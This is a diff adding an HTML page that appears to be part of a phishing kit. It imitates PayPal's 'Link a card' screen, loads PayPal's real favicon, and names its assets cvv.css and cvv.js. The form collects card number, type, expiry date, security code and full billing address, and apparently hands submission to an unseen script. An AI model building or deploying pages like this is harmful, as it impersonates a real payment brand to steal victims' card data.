@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="stylesheet" href="./cvv.css">
+    <link rel="shortcut icon" href="https://www.paypalobjects.com/paypal-ui/logos/svg/paypal-mark-color.svg" type="image/x-icon">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>credit card </title>
+</head>
+<body>
+    <div class="main-container">
+        <div class="logo"></div>
+        <p class="main-header">Link a card</p>
+        <div  id="card-img-cont" class="card-type-image-cont">
+            <img id="img" src="./photos/none.png" alt="">
+        </div>
+        <form id="form" action="">
+            <div id="card-num-cont" class="card-num-cont">
+                <label id="card-num-label" class="card-num-label" for="card-num">Debit or credit card number</label>
+                <input required onfocus=cardLabelUp() onblur=cardLabelDown() 
+                oninput=checkCardNum() id="card-num" class="card-num-field" type="text">
+            </div>
+            <div id="card-type-cont" class="card-type-cont">
+                <label id="card-type-label" class="card-type-label" for="card-type">card type</label>
+                <select required onchange=cardTypeImage() onclick=cardTypeUp() onblur=cardTypeDown()   class="card-type"  name="" id="card-type">
+                    <option value="none">Select your card type</option>
+                    <option value="visa">Visa</option>
+                    <option value="master">Mastercard</option>
+                    <option value="america">American Express</option>
+                    <option value="discover">Discover</option>
+                </select>
+            </div>
+            <div id="card-exp-cont" class="card-date-cont">
+                <label id="card-exp-label" class="card-num-label" for="card-exp">Expiration date</label>
+                <input required onfocus=cardExpUp()  onblur=cardExpDown() oninput=checkDate() placeholder="" id="card-exp" class="card-exp-field" type="text">
+            </div>
+            <div class="card-code">
+                <div id="card-code-cont" class="card-code-cont">
+                    <label id="card-code-label" class="card-num-label" for="card-code">Security code</label>
+                    <input required onfocus=cardCodeUp() onblur=cardCodeDown() placeholder="" id="card-code" class="card-exp-field" type="text">
+                
+                </div>
+                <img height=40px"" src="./photos/code.png" alt="">
+            </div>
+
+            <!-- address line 1 -->
+            <div id="card-addr-cont" class="card-addr-cont">
+                <label id="card-addr-label" class="card-num-label" for="card-addr">Address line 1</label>
+                <input required onfocus=cardAddrUp() onblur=cardAddrDown() placeholder="" id="card-addr" class="card-exp-field" type="text">
+            </div>
+
+            <!-- address line 2 -->
+            <div id="card-addr2-cont" class="card-addr-cont">
+                <label id="card-addr2-label" class="card-num-label" for="card-addr2">Address line 2</label>
+                <input placeholder="" id="card-addr2" class="card-exp-field" type="text">
+            </div>
+            <!-- city -->
+            <div id="card-addr3-cont" class="card-addr-cont">
+                <label id="card-addr2-label" class="card-num-label" for="city">City</label>
+                <input required placeholder="" id="city" class="card-exp-field" type="text">
+            </div> 
+            <!-- Postcode -->
+            <div id="card-addr3-cont" class="card-addr-cont">
+                <label id="card-addr2-label" class="card-num-label" for="postcode">Postcode</label>
+                <input required placeholder="" id="postcode" class="card-exp-field" type="text">
+            </div>
+            <!-- country -->
+            <!-- <div id="card-addr3-cont" class="card-addr-cont">
+                <label id="card-addr2-label" class="card-num-label" for="country">Country</label>
+                <input required placeholder="" id="country" class="card-exp-field" type="text">
+            </div> -->
+            <!-- state/capital -->
+            <div id="card-addr3-cont" class="card-addr-cont">
+                <label id="card-addr2-label" class="card-num-label" for="state">State</label>
+                <input required placeholder="" id="state" class="card-exp-field" type="text">
+            </div>
+
+            <input class="submit-btn" type="submit" value="Link Card">
+            
+
+        </form>
+    </div>
+    
+    <div class="progress" >
+        <div class="spinner"></div>
+    </div>
+</body>
+<script src="./cvv.js"></script>
+</html>
